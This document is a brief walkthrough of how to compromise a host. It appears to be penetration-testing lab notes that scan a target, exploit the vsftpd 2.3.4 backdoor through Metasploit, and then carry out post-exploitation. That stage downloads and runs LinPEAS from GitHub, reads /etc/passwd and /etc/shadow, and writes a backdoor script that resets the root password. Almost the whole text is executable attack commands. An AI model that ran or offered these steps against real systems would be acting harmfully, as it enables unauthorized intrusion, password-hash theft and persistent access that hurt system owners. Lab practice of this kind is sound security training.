Example Commands

step 1:
Ping the Target:
ping 0.0.0.0

Re-scan the Target:
nmap -sT -sV 0.0.0.0

Step 2: Exploit the Vulnerability
Using Metasploit
Start Metasploit:

msfconsole

Search for the Exploit:
search vsftpd 2.3.4

Use the Exploit:
use exploit/unix/ftp/vsftpd_234_backdoor


Set the Target IP: 
set RHOST 0.0.00.0


Run the Exploit:
exploit

Step 3: Post-Exploitation

Once you have gained access, you can perform various post-exploitation tasks such as:

Escalate Privileges:

Use tools like LinPEAS or LinEnum to check for privilege escalation opportunities.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh


Enumerate the System:

Gather information about the system, users, and installed software.

uname -a
cat /etc/passwd
cat /etc/shadow


Maintain Access:

Create a backdoor or persistent access.

echo "echo 'root:password' | chpasswd" > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh


Example Commands

Search for Exploits in Metasploit:
search vsftpd 2.3.4

Use the Exploit in Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.101.131
exploit

Run LinPEAS:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh


